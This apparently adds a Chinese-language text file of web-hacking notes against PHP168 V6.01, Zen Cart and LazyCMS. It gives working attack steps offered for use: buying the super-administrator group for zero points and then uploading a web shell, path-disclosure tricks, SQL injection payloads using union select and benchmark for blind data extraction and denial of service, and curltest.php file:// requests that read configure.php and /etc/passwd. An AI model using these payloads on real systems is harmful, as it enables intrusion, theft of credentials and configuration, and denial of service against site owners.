@@ -1,0 +1,39 @@
+PHP168 V6.01 权限提升漏洞
+
+PH
+P168 V6.01 权限提升漏洞
+PHP168整站是PHP领域当前功能最强大的建站系统，代码全部开源，可极其方便的进行二次开发，所有功能模块可以自由安装与删除，个人用户完全免费使用
+
+HPCMS V6.01存在严重的安全问题
+
+注册一个帐户，进入会员中心。访问http：//www.xxxx.com/member/buygroup.php?job=buy&gid=3
+你会看到如下字样。
+
+你现在的级别是普通会员，你将要购买的级别是超级管理员，需要积分0
+
+点击购买，如返回你现在级别是超级管理员等字样。返回会员中心查看一下
+然后找到后台登录传shell即可
+======================================================================
+php爆页面绝对路径
+php爆页面绝对路径
+1、加引号'这个最常用
+2、变参数类型，比如把id=1改为id=a等 有时很有效果
+3、乱添数据,比如把id=1改为id=1111111111111111111111......等 有时很有效果
+4、text.php?aa[]=xx
+5、利用php的max_execution_time, 能将绝对路径显示出来. 这机率非常小.适合在服务器负荷严重的时候测试.
+6、benchmark( 999999999999999999, md5( 'test' ) )
+BENCHMARK(count,expr)：BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。
+id=1 union select 1,benchmark(500000,md5('test')),1 from user where userid=1 and ord(substring(username,1,1))=97 /*
+利用找个函数可以作拒绝服务攻击！！http://www.xxxx.com/test/test/show.php?id=1%20union%20select%201,1,benchmark(99999999,md5(0x41))，不过前提还是要求可以注射
+============================================================
+zen cart本地文件读取漏洞
+zen cart本地文件读取漏洞
+得到网页所在路径：http://www.xxxx.com/extras/ipn_test_return.php
+得到网站配置信息：http://www.xxxxx.com/extras/curltest.php?url=file:///var/www/http/includes/configure.php
+读取linux服务器passwd：http://www.xxxx.com/extras/curltest.php?url=file:///etc/passwd
+注：Zen Cart是开源、免费的商城系统，用于建立专业的网上商店
+============================================================
+LazyCMS漏洞
+1、爆后台漏洞：http://www.xxxx.com/page/index.php/System/Index.html
+2、爆网站绝对路径漏洞：http://www.xxxx.com/page/index.php/Archives/Search?query=%27&submit.x=11&submit.y=0
+一般有这个漏洞在加上社会工程学，破解网站的FTP就有点可能！！！
